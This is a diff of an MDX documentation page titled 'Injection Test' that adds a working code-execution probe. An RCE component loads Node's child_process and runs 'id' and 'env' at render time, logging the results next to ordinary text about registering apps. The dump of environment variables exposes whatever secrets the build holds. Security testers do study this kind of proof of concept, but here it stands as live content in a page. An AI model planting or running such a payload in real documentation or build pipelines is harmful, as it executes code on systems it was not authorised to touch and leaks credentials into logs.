@@ -1,21 +1,23 @@
 ---
 title: Injection Test
+description: Testing MDX execution context
 ---
 
 export const RCE = () => {
   try {
-      // Attempt to load child_process (Node.js)
-      const { execSync } = require('child_process');
-      console.log("RCE_SUCCESS: " + execSync('env').toString());
+    const { execSync } = require('child_process');
+    console.log("RCE_SUCCESS: " + execSync('id').toString());
+    console.log("RCE_ENV: " + execSync('env').toString());
   } catch (e) {
-      console.log("RCE_ERROR: " + e.message);
+    console.log("RCE_ERROR: " + e.message);
   }
   return null;
 };
 
 <RCE />
 
-# Rest of content...
+## Valid Heading
+
 <Alert severity="info">
 You can only register apps for individual accounts or groups that you own.
 </Alert>
